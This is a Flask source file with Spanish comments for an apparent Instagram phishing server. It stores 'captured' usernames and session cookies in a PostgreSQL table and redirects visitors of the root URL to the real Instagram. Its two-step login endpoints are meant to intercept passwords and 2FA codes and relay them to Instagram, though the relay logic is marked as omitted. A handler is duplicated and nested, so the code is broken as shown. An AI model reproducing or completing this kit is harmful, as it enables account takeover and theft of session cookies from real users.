# app.py (Versión Corregida con Esquema 'public' y Lógica Mínima)

import os
import json
import requests
from flask import Flask, request, jsonify, redirect
from flask_sqlalchemy import SQLAlchemy 

# ================================================================
# 1. CONFIGURACIÓN DE LA APLICACIÓN Y BASE DE DATOS
# ================================================================
app = Flask(__name__) 
app.secret_key = os.environ.get('FLASK_SECRET_KEY', 'SUPER_SECRETO_Y_SEGURO_CAMBIAR_ESTO')

# CONFIGURACIÓN DE POSTGRESQL
app.config['SQLALCHEMY_DATABASE_URI'] = os.environ.get('DATABASE_URL')
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False 

db = SQLAlchemy(app) 

# ================================================================
# 2. DEFINICIÓN DEL MODELO DE BASE DE DATOS (CORRECCIÓN DE ESQUEMA)
# ================================================================
class CapturedSession(db.Model):
    """Modelo para almacenar las sesiones de Instagram capturadas."""
    
    # 🚨 CORRECCIÓN VITAL PARA QUE LA TABLA FUNCIONE CON EL ESQUEMA 'public'
    __tablename__ = 'captured_session'
    __table_args__ = {'schema': 'public'} 
    
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    cookies_json = db.Column(db.Text, nullable=False) 
    capture_time = db.Column(db.DateTime, default=db.func.current_timestamp())

    def __repr__(self):
        return f'<Session {self.username}>'

# ================================================================
# 3. CONSTANTES Y FUNCIONES AUXILIARES (Lógica de Guardado Completa)
# ================================================================
USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
INSTAGRAM_LOGIN_URL = 'https://www.instagram.com/accounts/login/ajax/'
TEMP_SESSION_STORAGE = {}

def get_session_headers(session):
    csrf_token = session.cookies.get('csrftoken')
    return {
        'User-Agent': USER_AGENT,
        'X-Requested-With': 'XMLHttpRequest',
        'X-CSRFToken': csrf_token,
        'Referer': 'https://www.instagram.com/'
    }

def save_session_to_db(username, cookies_dict):
    """Guarda las cookies de sesión en la base de datos."""
    try:
        cookies_json = json.dumps(cookies_dict)
        
        # Crear un nuevo registro
        new_session = CapturedSession(username=username, cookies_json=cookies_json)
        
        # Añadir y confirmar (commit)
        db.session.add(new_session)
        db.session.commit()
        print(f"✅ Sesión de {username} guardada en PostgreSQL.")
        return True
    except Exception as e:
        # Esto te mostrará el error exacto en los logs de Render si la inserción falla
        print(f"❌ ERROR al guardar la sesión de {username} en la BD: {e}") 
        db.session.rollback() 
        return False
        
# ================================================================
# 4. ENDPOINTS (Cuerpo Omitido por Seguridad)
# ================================================================
@app.route('/')
def home():
    """Redirige el tráfico de la URL raíz a la página real de Instagram."""
    return redirect("https://www.instagram.com/", code=302)

@app.route('/api/login-step1', methods=['POST'])
def handle_step1():

    @app.route('/api/login-step1', methods=['POST'])
def handle_step1():
    # 🚨 PÉGALO AQUÍ: TRAZADO 1 (Línea 1 de la función)
    print("--- LOG: 1 - Se recibió la llamada a /api/login-step1.")
    
    data = request.get_json()
    username = data.get('username', 'usuario_desconocido')
    
    # 🚨 PÉGALO AQUÍ: TRAZADO 2 (Después de leer el usuario)
    print(f"--- LOG: 2 - Recibido usuario: {username}")
    
    # ... (El resto de tu lógica para hacer el POST a Instagram) ...
    
    # ... (Si el post a Instagram es exitoso y se obtienen las cookies) ...
    # 🚨 TRAZADO 4 (Antes de llamar al guardado)
    # print(f"--- LOG: 4 - A punto de llamar a save_session_to_db para {username}")
    # save_session_to_db(username, final_cookies) 
    
    return jsonify({"success": True, "message": "Placeholder"})
    # ... Lógica de captura de credenciales y primer POST a Instagram (OMITIDO) ...
    # ... En el caso de éxito, la función debe llamar a:
    # save_session_to_db(username, final_cookies) 
    return jsonify({"success": True, "message": "Placeholder"})


@app.route('/api/login-step2', methods=['POST'])
def handle_step2():
    # ... Lógica de captura de 2FA y segundo POST a Instagram (OMITIDO) ...
    # ... En el caso de éxito, la función debe llamar a:
    # save_session_to_db(temp_data['username'], final_cookies)
    return jsonify({"success": True, "message": "Placeholder"})

# ================================================================
# 5. INICIALIZACIÓN
# ================================================================
with app.app_context():
    db.create_all() 

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
    
